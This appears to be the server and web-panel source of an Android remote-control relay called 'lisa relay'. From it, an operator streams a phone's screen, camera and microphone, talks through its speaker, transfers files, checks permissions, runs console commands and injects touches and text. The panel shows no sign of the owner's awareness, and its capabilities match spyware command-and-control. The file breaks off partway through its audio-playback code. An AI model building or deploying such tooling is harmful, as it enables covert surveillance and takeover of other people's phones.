'use strict';
const http = require('http');
const crypto = require('crypto');
const { WebSocketServer } = require('ws');

const PORT   = process.env.PORT || 8080;
const SECRET = process.env.SECRET || '';
const TTL    = 45000;
const MAXMSG = 8 * 1024 * 1024;
const MAXDEV = 400;

/* binary kinds: 1=screen 2=cam 3=audio 4=talk 10=up-chunk 11=dl-chunk */

const devices = new Map();
const viewers = new Set();

const token = () => SECRET
  ? crypto.createHmac('sha256', SECRET).update('lisa').digest('hex')
  : '';

function eq(a, b) {
  const x = Buffer.from(String(a));
  const y = Buffer.from(String(b));
  if (x.length !== y.length) return false;
  try { return crypto.timingSafeEqual(x, y); } catch (_) { return false; }
}

const authed = (req) => {
  if (!SECRET) return true;
  const c = req.headers.cookie || '';
  return c.split(';').some(p => p.trim() === 'lisa=' + token());
};

function originOk(req) {
  const o = req.headers.origin;
  if (!o || o === 'null') return true;
  try {
    const u = new URL(o);
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return false;
    const host = req.headers['x-forwarded-host'] || req.headers.host;
    return !host || u.host === host;
  } catch (_) { return false; }
}

const ipOf = (req) => (process.env.TRUST_PROXY
  ? (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
  : '') || req.socket.remoteAddress || '?';

const tries = new Map();
function rateOk(ip) {
  const now = Date.now();
  const e = tries.get(ip) || { c: 0, t: now };
  if (now - e.t > 60000) { e.c = 0; e.t = now; }
  e.c++;
  tries.set(ip, e);
  if (tries.size > 4000) tries.clear();
  return e.c <= 12;
}

/* ---------------- registry ---------------- */

function reg(id, ws, meta) {
  const old = devices.get(id);
  if (old) { try { old.ws.close(); } catch (_) {} clearTimeout(old.timer); }
  const d = { id, ws, meta, viewers: new Set(), last: Date.now(), timer: null };
  devices.set(id, d);
  arm(d);

  for (const v of viewers) {
    if (v.cur !== id || v.readyState !== 1) continue;
    d.viewers.add(v);
    try { v.send(JSON.stringify({ t: 'attached', id, name: meta.name, meta })); } catch (_) {}
    tell(d);
  }
  pushList();
  console.log('+ device', id, meta.name);
  return d;
}

function arm(d) {
  clearTimeout(d.timer);
  d.timer = setTimeout(() => {
    if (Date.now() - d.last > TTL) drop(d, 'timeout');
    else arm(d);
  }, 5000);
}

function drop(d, why) {
  clearTimeout(d.timer);
  if (devices.get(d.id) === d) devices.delete(d.id);
  const msg = JSON.stringify({ t: 'detach', why });
  for (const v of d.viewers) { try { if (v.readyState === 1) v.send(msg); } catch (_) {} }
  d.viewers.clear();
  try { d.ws.close(); } catch (_) {}
  pushList();
  console.log('- device', d.id, why);
}

function tell(d) {
  if (!d || d.ws.readyState !== 1) return;
  try { d.ws.send(JSON.stringify({ t: 'attach', n: d.viewers.size })); } catch (_) {}
}

const listPayload = () => JSON.stringify({
  t: 'devices',
  list: [...devices.values()].map(d => ({
    id: d.id, name: d.meta.name, brand: d.meta.brand,
    android: d.meta.android, batt: d.meta.batt,
    viewers: d.viewers.size, last: d.last
  }))
});

function pushList() {
  const msg = listPayload();
  for (const v of viewers) { try { if (v.readyState === 1) v.send(msg); } catch (_) {} }
}

/* ---------------- http ---------------- */

const HDRS = {
  'X-Content-Type-Options': 'nosniff',
  'Referrer-Policy': 'no-referrer',
  'X-Frame-Options': 'DENY',
  'Content-Security-Policy':
    "default-src 'self'; img-src 'self' blob: data:; media-src 'self' blob:; " +
    "style-src 'unsafe-inline'; script-src 'unsafe-inline'; connect-src 'self' ws: wss:"
};

const server = http.createServer((req, res) => {
  let u;
  try { u = new URL(req.url, 'http://x'); } catch (_) {
    res.writeHead(400, HDRS); return res.end('bad');
  }

  if (u.pathname === '/healthz') { res.writeHead(200, HDRS); return res.end('ok'); }

  if (u.pathname === '/login' && req.method === 'POST') {
    if (!rateOk(ipOf(req))) { res.writeHead(429, HDRS); return res.end('slow down'); }
    let b = '';
    req.on('data', c => { b += c; if (b.length > 4096) req.destroy(); });
    req.on('end', () => {
      const k = new URLSearchParams(b).get('key') || '';
      if (!SECRET || !eq(k, SECRET)) {
        res.writeHead(302, Object.assign({ Location: '/?bad=1' }, HDRS));
        return res.end();
      }
      const secure = req.headers['x-forwarded-proto'] === 'https' ? '; Secure' : '';
      res.writeHead(302, Object.assign({
        'Set-Cookie': 'lisa=' + token() +
          '; Path=/; HttpOnly; SameSite=Lax; Max-Age=2592000' + secure,
        Location: '/'
      }, HDRS));
      res.end();
    });
    return;
  }

  if (u.pathname === '/api/devices') {
    if (!authed(req)) { res.writeHead(401, HDRS); return res.end('{}'); }
    res.writeHead(200, Object.assign({ 'Content-Type': 'application/json' }, HDRS));
    return res.end(JSON.stringify([...devices.values()].map(d => ({
      id: d.id, name: d.meta.name, brand: d.meta.brand,
      android: d.meta.android, batt: d.meta.batt, viewers: d.viewers.size
    }))));
  }

  if (u.pathname !== '/') { res.writeHead(404, HDRS); return res.end('404'); }

  if (!authed(req)) {
    res.writeHead(200, Object.assign({ 'Content-Type': 'text/html; charset=utf-8' }, HDRS));
    return res.end(u.searchParams.get('bad') ? LOGIN_BAD : LOGIN);
  }
  res.writeHead(200, Object.assign({ 'Content-Type': 'text/html; charset=utf-8' }, HDRS));
  res.end(PAGE);
});

/* ---------------- ws ---------------- */

function reject(sock, code, msg) {
  try {
    sock.write('HTTP/1.1 ' + code + ' ' + msg +
      '\r\nConnection: close\r\nContent-Length: 0\r\n\r\n');
  } catch (_) {}
  try { sock.destroy(); } catch (_) {}
}

const wss = new WebSocketServer({ noServer: true, maxPayload: MAXMSG });
wss.on('error', () => {});

server.on('upgrade', (req, sock, head) => {
  let u;
  try { u = new URL(req.url, 'http://x'); } catch (_) { return reject(sock, 400, 'Bad'); }
  if (!u.pathname.endsWith('/ws') && u.pathname !== '/') return reject(sock, 404, 'Not Found');
  if (!originOk(req)) return reject(sock, 403, 'Origin');

  const role = u.searchParams.get('role');
  if (role === 'viewer') {
    if (!authed(req)) return reject(sock, 401, 'Unauthorized');
  } else if (role === 'device') {
    if (SECRET && !eq(u.searchParams.get('key') || '', SECRET))
      return reject(sock, 401, 'Unauthorized');
    const id = (u.searchParams.get('id') || '').slice(0, 40);
    if (!id) return reject(sock, 400, 'No id');
    if (!devices.has(id) && devices.size >= MAXDEV) return reject(sock, 503, 'Full');
  } else return reject(sock, 400, 'Bad role');

  wss.handleUpgrade(req, sock, head, ws => wss.emit('connection', ws, req, u, role));
});

wss.on('connection', (ws, req, u, role) => {
  ws.alive = true;

  if (role === 'device') {
    const id = (u.searchParams.get('id') || '').slice(0, 40);
    if (!id) return ws.close();
    const d = reg(id, ws, {
      name: (u.searchParams.get('name') || '?').slice(0, 60),
      brand: (u.searchParams.get('brand') || '').slice(0, 40),
      android: (u.searchParams.get('android') || '').slice(0, 8),
      batt: (u.searchParams.get('batt') || '').slice(0, 8)
    });
    ws.on('message', (data, bin) => {
      d.last = Date.now();
      for (const v of d.viewers) {
        if (v.readyState === 1) { try { v.send(data, { binary: bin }); } catch (_) {} }
      }
    });
    ws.on('close', () => { if (devices.get(id) === d) drop(d, 'closed'); });
    ws.on('error', () => {});
    ws.on('pong', () => { d.last = Date.now(); });
    return;
  }

  viewers.add(ws);
  ws.cur = null;

  const send = (o) => {
    if (ws.readyState === 1) { try { ws.send(JSON.stringify(o)); } catch (_) {} }
  };

  send(JSON.parse(listPayload()));

  ws.on('message', (data, bin) => {
    if (bin) {
      const d = ws.cur && devices.get(ws.cur);
      if (d && d.ws.readyState === 1) { try { d.ws.send(data, { binary: true }); } catch (_) {} }
      return;
    }
    let m;
    try { m = JSON.parse(data.toString()); } catch (_) { return; }

    if (m.t === 'attach') {
      const d = devices.get(m.id);
      if (!d) return send({ t: 'err', v: 'device offline' });
      if (ws.cur && ws.cur !== m.id) {
        const prev = devices.get(ws.cur);
        if (prev) { prev.viewers.delete(ws); tell(prev); }
      }
      ws.cur = d.id;
      d.viewers.add(ws);
      tell(d);
      send({ t: 'attached', id: d.id, name: d.meta.name, meta: d.meta });
      pushList();
      return;
    }
    if (m.t === 'detach') {
      const d = ws.cur && devices.get(ws.cur);
      if (d) { d.viewers.delete(ws); tell(d); }
      ws.cur = null;
      pushList();
      return;
    }
    const d = ws.cur && devices.get(ws.cur);
    if (!d) return send({ t: 'err', v: 'not attached' });
    if (d.ws.readyState !== 1) return send({ t: 'err', v: 'device offline' });
    d.last = Date.now();
    try { d.ws.send(JSON.stringify(m)); } catch (_) {}
  });

  ws.on('close', () => {
    viewers.delete(ws);
    const d = ws.cur && devices.get(ws.cur);
    if (d) { d.viewers.delete(ws); tell(d); }
    ws.cur = null;
    pushList();
  });
  ws.on('error', () => {});
});

const ping = setInterval(() => {
  for (const ws of wss.clients) {
    if (ws.readyState !== 1) continue;
    if (ws.alive === false) { try { ws.terminate(); } catch (_) {} continue; }
    ws.alive = false;
    try { ws.ping(); } catch (_) {}
  }
}, 25000);

/* ---------------- pages ---------------- */

const SHELL = `<!doctype html><html lang=en><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name=theme-color content="#070a10">
<title>lisa relay</title><style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
:root{--bg:#070a10;--pan:#0d121c;--ln:#1b2432;--tx:#dbe6f7;--dim:#7b8aa3;
--ac:#3b82f6;--ok:#22c55e;--rd:#ef4444}
html,body{height:100%}
body{background:var(--bg);color:var(--tx);font:14px/1.4 -apple-system,Roboto,sans-serif;
display:flex;flex-direction:column;overflow:hidden}
#top{height:52px;flex:0 0 52px;display:flex;align-items:center;gap:8px;padding:0 12px;
background:#080b12;border-bottom:1px solid var(--ln);z-index:30}
#ttl{flex:1;font-size:12px;font-weight:700;letter-spacing:.12em;color:#5fa8ff;
white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
#dot{font-size:10px;padding:5px 9px;border-radius:20px;background:#ffffff0f;
border:1px solid var(--ln);color:var(--dim);white-space:nowrap}
.ib{width:32px;height:32px;flex:0 0 32px;border-radius:9px;border:1px solid var(--ln);
background:#ffffff0d;color:var(--tx);font-size:14px;display:flex;align-items:center;
justify-content:center;cursor:pointer;transition:.12s}
.ib:active{background:var(--ac);border-color:var(--ac)}
#list{flex:1;overflow-y:auto;padding:12px}
.dv{background:var(--pan);border:1px solid var(--ln);border-radius:14px;padding:14px;
margin-bottom:10px;cursor:pointer;display:flex;align-items:center;gap:12px;transition:.12s}
.dv:active{border-color:var(--ac);transform:scale(.99)}
.dv .av{width:40px;height:40px;flex:0 0 40px;border-radius:12px;background:#132033;
display:flex;align-items:center;justify-content:center;font-size:18px}
.dv .n{font-size:14px;font-weight:600}
.dv .s{font-size:10.5px;color:var(--dim);margin-top:3px}
.empty{padding:52px 16px;text-align:center;color:var(--dim);font-size:12px;line-height:1.9}
.empty .big{font-size:34px;margin-bottom:14px;opacity:.5}
#panel{flex:1;display:none;flex-direction:column;min-height:0}
#panel.on{display:flex}
#tabs{display:flex;gap:4px;padding:7px;background:#080b12;border-bottom:1px solid var(--ln);overflow-x:auto}
.tb{padding:8px 11px;border-radius:9px;border:1px solid var(--ln);background:#ffffff0d;
color:var(--tx);font-size:12px;white-space:nowrap;cursor:pointer}
.tb.on{background:var(--ac);border-color:var(--ac)}
#body{flex:1;overflow:auto;position:relative;min-height:0}
.stage{height:100%;display:flex;align-items:center;justify-content:center;background:#000;position:relative}
#cv{max-width:100%;max-height:100%;touch-action:none;display:block}
#cam{max-width:100%;max-height:100%;object-fit:contain}
#bar{display:flex;gap:5px;padding:7px;background:#080b12;border-top:1px solid var(--ln);flex-wrap:wrap}
.b{flex:1;min-width:42px;height:42px;border-radius:11px;border:1px solid var(--ln);
background:#ffffff0d;color:var(--tx);font-size:14px;display:flex;align-items:center;
justify-content:center;cursor:pointer;transition:.12s}
.b:active{background:var(--ac);border-color:var(--ac)}
.b.on{background:var(--ok);border-color:var(--ok);color:#04240f}
.pad{padding:12px}
.row{display:flex;align-items:center;gap:8px;padding:10px 8px;border-radius:10px;cursor:pointer}
.row:active{background:#ffffff12}
.rn{flex:1;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;font-size:13px}
.rs{font-size:10px;color:var(--dim);flex:0 0 auto}
.ic{width:28px;height:28px;flex:0 0 28px;border-radius:8px;background:#ffffff0f;
display:flex;align-items:center;justify-content:center;font-size:13px}
.mn{width:28px;height:28px;flex:0 0 28px;border-radius:8px;background:#ffffff0f;
display:flex;align-items:center;justify-content:center;font-size:12px}
#fbar{display:flex;gap:6px;padding:7px;border-bottom:1px solid var(--ln);background:var(--pan);align-items:center}
#fpath{flex:1;font-size:11px;color:var(--dim);overflow:hidden;white-space:nowrap;
text-overflow:ellipsis;direction:rtl;text-align:left}
pre{font-family:ui-monospace,monospace;font-size:11.5px;line-height:1.55;padding:12px;
white-space:pre-wrap;word-break:break-word;color:#c7d5ea}
#log .e{border-bottom:1px solid #131a26;padding:10px 12px}
#log .k{font-size:10px;color:#5fa8ff;margin-bottom:5px;letter-spacing:.08em}
#cin{display:flex;gap:6px;padding:8px;border-top:1px solid var(--ln);background:#080b12}
#cin input{flex:1;padding:11px;border-radius:10px;border:1px solid var(--ln);background:#04070c;
color:#fff;font-size:14px;outline:none}
#qk{display:flex;gap:5px;flex-wrap:wrap;padding:8px;border-top:1px solid var(--ln);
background:#080b12;max-height:118px;overflow-y:auto}
.q{font-size:11px;padding:7px 10px;border-radius:9px;border:1px solid var(--ln);
background:#ffffff0d;cursor:pointer;white-space:nowrap}
.q:active{background:var(--ac)}
#toast{position:fixed;left:50%;transform:translateX(-50%);bottom:70px;padding:9px 15px;
border-radius:11px;background:#141a26f7;border:1px solid var(--ln);font-size:12px;
opacity:0;transition:.2s;z-index:80;pointer-events:none}
#toast.on{opacity:1}
.info{font-size:12px;line-height:1.9;padding:14px;color:var(--dim)}
.info b{color:var(--tx)}
#modal{position:fixed;inset:0;background:#000000f2;z-index:70;display:none;
flex-direction:column;align-items:center;justify-content:center;padding:14px}
#modal.on{display:flex}
#modal img,#modal video{max-width:100%;max-height:82%;border-radius:10px}
#modal audio{width:100%;max-width:420px}
#mx{position:absolute;top:14px;right:14px;width:38px;height:38px;border-radius:11px;
background:#ffffff1a;border:1px solid var(--ln);color:#fff;font-size:17px;display:flex;
align-items:center;justify-content:center;cursor:pointer}
#mname{color:var(--dim);font-size:11px;margin-bottom:8px;word-break:break-all;text-align:center}
#sheet{position:fixed;inset:0;background:#000000a8;z-index:65;display:none;align-items:flex-end}
#sheet.on{display:flex}
#sin{width:100%;background:var(--pan);border-radius:16px 16px 0 0;padding:12px;
max-height:70vh;overflow-y:auto}
.mi{padding:13px 10px;border-radius:10px;cursor:pointer;font-size:13px}
.mi:active{background:#ffffff12}
.mi.rd{color:#fca5a5}
#stitle{font-size:11px;color:var(--dim);margin-bottom:8px;word-break:break-all}
.per{display:flex;align-items:center;gap:9px;padding:11px 10px;border-radius:10px;
border:1px solid var(--ln);margin-bottom:7px;background:var(--pan)}
.per .nm{flex:1;font-size:12.5px}
.per .st{font-size:11px}
.meter{height:6px;border-radius:3px;background:#ffffff14;overflow:hidden;margin-top:12px}
.meter div{height:100%;width:0;background:var(--ok);transition:width .08s}
.big-b{height:56px;font-size:15px}
</style></head><body>
<div id=top>
  <div class=ib id=back style="display:none">←</div>
  <div id=ttl>lisa relay</div>
  <div id=dot>—</div>
  <div class=ib id=reload>⟳</div>
</div>
<div id=list><div class=empty><div class=big>📡</div>searching for devices…</div></div>
<div id=panel>
  <div id=tabs>
    <div class="tb on" data-v=screen>Screen</div>
    <div class=tb data-v=camera>Camera</div>
    <div class=tb data-v=audio>Audio</div>
    <div class=tb data-v=files>Files</div>
    <div class=tb data-v=perms>Perms</div>
    <div class=tb data-v=info>Info</div>
    <div class=tb data-v=console>Console</div>
  </div>
  <div id=body></div>
</div>
<div id=modal><div id=mx>✕</div><div id=mname></div><div id=mb></div></div>
<div id=sheet><div id=sin><div id=stitle></div><div id=mitems></div></div></div>
<div id=toast></div>`;

const LOGIN = SHELL + `
<div class=pad style="flex:1;display:flex;align-items:center;justify-content:center">
<form method=post action=/login style="background:#0d121c;border:1px solid #1b2432;border-radius:18px;
padding:26px;width:300px">
<div style="font-size:12px;letter-spacing:.22em;color:#5fa8ff;margin-bottom:18px;text-align:center">LISA RELAY</div>
<input name=key type=password placeholder="access key" autofocus
style="width:100%;padding:13px;border-radius:11px;border:1px solid #1b2432;background:#04070c;
color:#fff;font-size:15px;outline:none;margin-bottom:12px">
<button style="width:100%;padding:13px;border-radius:11px;border:0;background:#3b82f6;color:#fff;
font-size:14px;font-weight:600;cursor:pointer">Enter</button>
</form></div></body></html>`;

const LOGIN_BAD = LOGIN.replace('</form>',
  '<p style="color:#fca5a5;font-size:11px;text-align:center;margin-top:10px">wrong key</p></form>');

const PAGE = SHELL + `<script>
var $ = function(s){ return document.querySelector(s); };
var dot = $('#dot'), list = $('#list'), panel = $('#panel'), body = $('#body');
var ws = null, cur = null, devs = [], view = 'screen', camFront = 1, rtries = 0;
var screenOn = false, camOn = false, audioOn = false, talkOn = false;
var actx = null, apos = 0, aseq = 0, micCtx = null, micStream = null, micNode = null;
var curPath = '', curUp = '', clip = null, dlCur = null;
var dl = new Map();

function toast(m){ var t = $('#toast'); t.textContent = m; t.classList.add('on');
  clearTimeout(t._h); t._h = setTimeout(function(){ t.classList.remove('on'); }, 1700); }

function b64e(s){ var u = new Uint8Array(new TextEncoder().encode(s)), o = '';
  for (var i = 0; i < u.length; i++) o += String.fromCharCode(u[i]);
  return btoa(o).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,''); }
function fmt(n){ return n < 1024 ? n + ' B' : n < 1048576 ? (n/1024|0) + ' KB'
  : n < 1073741824 ? (n/1048576).toFixed(1) + ' MB' : (n/1073741824).toFixed(2) + ' GB'; }
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

function tx(o){ if (ws && ws.readyState === 1) ws.send(JSON.stringify(o)); }
function bin(kind, buf){ if (!ws || ws.readyState !== 1) return;
  var out = new Uint8Array(buf.byteLength + 1); out[0] = kind;
  out.set(new Uint8Array(buf), 1); ws.send(out.buffer); }

function conn(){
  ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws?role=viewer');
  ws.binaryType = 'arraybuffer';
  ws.onopen = function(){ rtries = 0; dot.textContent = '● online'; dot.style.color = '#22c55e';
    if (cur) { tx({ t: 'attach', id: cur }); restore(); } };
  ws.onmessage = onMsg;
  ws.onclose = function(){ dot.textContent = '● lost'; dot.style.color = '#ef4444';
    rtries++; setTimeout(conn, Math.min(15000, 800 * Math.pow(1.6, rtries))); };
  ws.onerror = function(){};
}

function restore(){
  if (view === 'screen' && screenOn) tx({ t: 'screen', on: true, q: 58, fps: 8 });
  if (view === 'camera' && camOn) tx({ t: 'cam', on: true, front: camFront });
  if (view === 'audio' && audioOn) tx({ t: 'audio', on: true });
  if (view === 'audio' && talkOn) tx({ t: 'talk', on: true });
}

function onMsg(e){
  if (typeof e.data === 'string'){
    var m; try { m = JSON.parse(e.data); } catch (_) { return; }
    handle(m); return;
  }
  var a = new Uint8Array(e.data), kind = a[0], pay = a.subarray(1);
  if (kind === 1) drawScreen(pay);
  else if (kind === 2) drawCam(pay);
  else if (kind === 3) playPcm(pay);
  else if (kind === 11) gotChunk(pay);
}

function handle(m){
  if (m.t === 'devices'){ devs = m.list; renderList(); return; }
  if (m.t === 'attached'){ cur = m.id; $('#ttl').textContent = m.name || m.id;
    list.style.display = 'none'; panel.classList.add('on'); $('#back').style.display = 'flex';
    go('screen'); return; }
  if (m.t === 'detach'){
    if (m.why === 'timeout'){ toast('device lost — waiting…'); return; }
    toast('device ' + (m.why || 'gone')); leave(); return; }
  if (m.t === 'text'){ log('reply', m.v || ''); return; }
  if (m.t === 'dl_begin'){ dlCur = { tid: m.tid, n: m.n, parts: [] }; dl.set(m.tid, dlCur); return; }
  if (m.t === 'dl_end'){
    var t = dl.get(m.tid); dl.delete(m.tid);
    if (dlCur && dlCur.tid === m.tid) dlCur = null;
    if (!t) return;
    var blob = new Blob(t.parts, { type: m.mime || 'application/octet-stream' });
    if (m.inline) showModal(blob, m.n, m.mime);
    else { var a = document.createElement('a'); a.href = URL.createObjectURL(blob);
      a.download = t.n; a.click(); setTimeout(function(){ URL.revokeObjectURL(a.href); }, 20000);
      toast('saved ' + t.n); }
    return;
  }
  if (m.t === 'fs_list'){ renderFiles(m); return; }
  if (m.t === 'perm_list'){ renderPerms(m); return; }
  if (m.t === 'dev_info'){ renderInfo(m); return; }
  if (m.t === 'up_ok'){ toast('uploaded ' + m.n); load(curPath); return; }
  if (m.t === 'err'){ toast(m.v || 'error'); return; }
}

function renderList(){
  list.innerHTML = '';
  if (!devs.length){ list.innerHTML =
    '<div class=empty><div class=big>📡</div>no device online<br>ফোনে relay চালু আছে কিনা দেখুন</div>';
    return; }
  devs.forEach(function(d){
    var el = document.createElement('div');
    el.className = 'dv';
    el.innerHTML = '<div class=av>📱</div><div style="flex:1;min-width:0"><div class=n>' +
      esc(d.name) + '</div><div class=s>' + esc(d.brand || '') + ' · SDK ' + esc(d.android) +
      ' · ' + esc(d.batt) + '% · ' + d.viewers + ' viewer</div></div>' +
      '<div style="color:#7b8aa3">›</div>';
    el.onclick = function(){ tx({ t: 'attach', id: d.id }); };
    list.appendChild(el);
  });
}

function leave(){
  stopAll();
  tx({ t: 'detach' });
  cur = null;
  panel.classList.remove('on');
  $('#back').style.display = 'none';
  list.style.display = 'block';
  $('#ttl').textContent = 'lisa relay';
}

document.querySelectorAll('.tb').forEach(function(t){ t.onclick = function(){ go(t.dataset.v); }; });

function go(v){
  document.querySelectorAll('.tb').forEach(function(t){ t.classList.toggle('on', t.dataset.v === v); });
  view = v;
  if (v !== 'screen' && screenOn){ screenOn = false; tx({ t: 'screen', on: false }); }
  if (v !== 'camera' && camOn){ camOn = false; tx({ t: 'cam', on: false }); }
  if (v !== 'audio' && audioOn){ audioOn = false; tx({ t: 'audio', on: false }); }
  if (v !== 'audio' && talkOn) talkStop();
  if (!cur) return;
  if (v === 'screen') buildScreen();
  else if (v === 'camera') buildCam();
  else if (v === 'audio') buildAudio();
  else if (v === 'files'){ curPath = ''; buildFiles(); }
  else if (v === 'perms') buildPerms();
  else if (v === 'info') buildInfo();
  else buildConsole();
}

function stopAll(){
  if (screenOn){ screenOn = false; tx({ t: 'screen', on: false }); }
  if (camOn){ camOn = false; tx({ t: 'cam', on: false }); }
  if (audioOn){ audioOn = false; tx({ t: 'audio', on: false }); }
  if (talkOn) talkStop();
}

/* ---------- screen ---------- */

function buildScreen(){
  body.innerHTML = '<div class=stage><canvas id=cv width=540 height=1170></canvas></div>' +
    '<div id=bar><div class=b data-k=back>◀</div><div class=b data-k=home>⌂</div>' +
    '<div class=b data-k=recents>▣</div><div class=b data-k=notif>🔔</div>' +
    '<div class=b data-k=enter>↵</div><div class=b data-k=del>⌫</div>' +
    '<div class=b data-k=lock>🔒</div><div class=b id=kb>⌨</div></div>' +
    '<div id=cin style="display:none"><input id=kt placeholder="type on phone…">' +
    '<div class=b id=ks style="max-width:56px">↵</div></div>';
  body.querySelectorAll('.b[data-k]').forEach(function(b){
    b.onclick = function(){ tx({ t: 'input', v: { t: 'key', k: b.dataset.k } }); }; });
  var cv = $('#cv'), cx = cv.getContext('2d');
  var pd = false, sx = 0, sy = 0, st = 0, moved = false;
  function rel(e){ var r = cv.getBoundingClientRect();
    return { x: (e.clientX - r.left) / r.width, y: (e.clientY - r.top) / r.height }; }
  cv.addEventListener('pointerdown', function(e){ e.preventDefault(); pd = true; moved = false;
    var p = rel(e); sx = p.x; sy = p.y; st = Date.now(); cv.setPointerCapture(e.pointerId); });
  cv.addEventListener('pointermove', function(e){ if (!pd) return; var p = rel(e);
    if (Math.abs(p.x - sx) > .02 || Math.abs(p.y - sy) > .02) moved = true; });
  cv.addEventListener('pointerup', function(e){ if (!pd) return; pd = false; var p = rel(e);
    if (!moved || Date.now() - st < 130) tx({ t: 'input', v: { t: 'tap', x: p.x, y: p.y } });
    else tx({ t: 'input', v: { t: 'swipe', x1: sx, y1: sy, x2: p.x, y2: p.y,
      ms: Math.min(600, Math.max(120, Date.now() - st)) } }); });
  var kbOn = false;
  $('#kb').onclick = function(){ kbOn = !kbOn; $('#cin').style.display = kbOn ? 'flex' : 'none';
    $('#kb').classList.toggle('on', kbOn); if (kbOn) $('#kt').focus(); };
  function sendText(){ var i = $('#kt'); if (!i.value) return;
    tx({ t: 'input', v: { t: 'text', v: i.value } }); i.value = ''; }
  $('#ks').onclick = sendText;
  $('#kt').addEventListener('keydown', function(e){ if (e.key === 'Enter'){ e.preventDefault(); sendText(); } });
  screenOn = true;
  tx({ t: 'screen', on: true, q: 58, fps: 8 });
}

function drawScreen(pay){
  var cv = $('#cv'); if (!cv) return;
  var u = URL.createObjectURL(new Blob([pay], { type: 'image/jpeg' }));
  var im = new Image();
  im.onload = function(){
    if (cv.width !== im.naturalWidth){ cv.width = im.naturalWidth; cv.height = im.naturalHeight; }
    cv.getContext('2d').drawImage(im, 0, 0); URL.revokeObjectURL(u); };
  im.src = u;
}

/* ---------- camera ---------- */

function buildCam(){
  body.innerHTML = '<div class=stage><img id=cam alt=""><div id=cmsg ' +
    'style="position:absolute;color:#7b8aa3;font-size:12px">starting…</div></div>' +
    '<div id=bar><div class="b on" id=fr>🤳 Front</div><div class=b id=bk>📷 Back</div>' +
    '<div class=b id=cmic>🎤</div><div class=b id=cshot>📸</div></div>';
  $('#fr').onclick = function(){ camFront = 1; $('#fr').classList.add('on');
    $('#bk').classList.remove('on'); tx({ t: 'cam', on: true, front: 1 }); };
  $('#bk').onclick = function(){ camFront = 0; $('#bk').classList.add('on');
    $('#fr').classList.remove('on'); tx({ t: 'cam', on: true, front: 0 }); };
  $('#cmic').onclick = function(){
    var on = !$('#cmic').classList.contains('on');
    $('#cmic').classList.toggle('on', on);
    if (on) ensureCtx(); audioOn = on; tx({ t: 'audio', on: on }); };
  $('#cshot').onclick = shot;
  camOn = true;
  tx({ t: 'cam', on: true, front: camFront });
}

function drawCam(pay){
  var el = $('#cam'); if (!el) return;
  var u = URL.createObjectURL(new Blob([pay], { type: 'image/jpeg' }));
  var old = el.src;
  el.onload = function(){ if (old && old.indexOf('blob:') === 0) URL.revokeObjectURL(old); };
  el.src = u;
  var m = $('#cmsg'); if (m) m.style.display = 'none';
}

/* ---------- audio + talk ---------- */

function ensureCtx(){
  if (!actx){ try { actx = new AudioContext({ sampleRate: 16000 }); }
    catch (_) { actx = new AudioContext(); } }
  if (actx.state === 'suspended') actx.resume();
  return actx;
}

function buildAudio(){
  body.innerHTML = '<div class=pad>' +
    '<div class="b big-b" id=ls>🎧 Start listening</div>' +
    '<div class=meter><div id=mtr></div></div>' +
    '<div style="height:14px"></div>' +
    '<div class="b big-b" id=tk>📢 Talk (walkie) — off</div>' +
    '<div style="font-size:11px;color:#7b8aa3;margin-top:10px;line-height:1.7">' +
    'Talk অন করলে আপনার কথা ফোনের স্পিকার দিয়ে শোনা যাবে।' +
    '</div><pre id=alog style="margin-top:12px"></pre></div>';
  $('#ls').onclick = function(){
    var on = !audioOn; audioOn = on;
    $('#ls').classList.toggle('on', on);
    $('#ls').textContent = on ? '🎧 Listening…' : '🎧 Start listening';
    if (on) ensureCtx();
    tx({ t: 'audio', on: on });
  };
  $('#tk').onclick = function(){ if (talkOn) talkStop(); else talkStart(); };
  if (audioOn){ $('#ls').classList.add('on'); $('#ls').textContent = '🎧 Listening…'; }
  if (talkOn){ $('#tk').classList.add('on'); $('#tk').textContent = '📢 Talking…'; }
}

async function talkStart(){
  if (!navigator.mediaDevices) return toast('mic not allowed');
  try {
    micStream = await navigator.mediaDevices.getUserMedia({ audio: {
      echoCancellation: true, noiseSuppression: true, channelCount: 1 } });
  } catch (_) { return toast('mic blocked'); }
  micCtx = new AudioContext();
  var src = micCtx.createMediaStreamSource(micStream);
  var proc = micCtx.createScriptProcessor(2048, 1, 1);
  var mute = micCtx.createGain(); mute.gain.value = 0;
  var ratio = micCtx.sampleRate / 16000;
  src.connect(proc); proc.connect(mute); mute.connect(micCtx.destination);
  proc.onaudioprocess = function(e){
    if (!talkOn) return;
    var f = e.inputBuffer.getChannelData(0);
    var n = Math.floor(f.length / ratio);
    if (n < 1) return;
    var out = new Int16Array(n);
    for (var i = 0; i < n; i++){
      var s = f[Math.floor(i * ratio)];
      out[i] = Math.max(-1, Math.min(1, s)) * 32767;
    }
    bin(4, out.buffer);
  };
  micNode = proc;
  talkOn = true;
  tx({ t: 'talk', on: true });
  var b = $('#tk'); if (b){ b.classList.add('on'); b.textContent = '📢 Talking…'; }
  toast('talk on');
}

function talkStop(){
  talkOn = false;
  tx({ t: 'talk', on: false });
  try { if (micNode) micNode.disconnect(); } catch (_) {}
  try { if (micStream) micStream.getTracks().forEach(function(t){ t.stop(); }); } catch (_) {}
  try { if (micCtx) micCtx.close(); } catch (_) {}
  micNode = null; micStream = null; micCtx = null; apos = 0;
  var b = $('#tk'); if (b){ b.classList.remove('on'); b.textContent = '📢 Talk (walkie) — off'; }
}

function playPcm(pay){
  try {
    if (!actx) return;
    var n = pay.length >> 1; if (!n) return;
    var f = new Float32Array(n), peak = 0;
    var dv = new DataView(pay.buffer, pay.byteOffset, pay.byteLength);
    for (var i = 0; i < n; i++){
      var v = dv.getInt16(i * 2, true) / 32768;
      f[i] = v; var a = Math.abs(v); if (a > peak) peak = a;
    }
    var mt = $('#mtr'); if (mt) mt.style.width = Math.min(100, peak * 180) + '%';
    var b = actx.createBuffer(1, n, 16000);
    b.copyToChannel(f, 0);
    var s = actx.createBufferSource();
    s.buffer = b; s.connect(actx.destination);
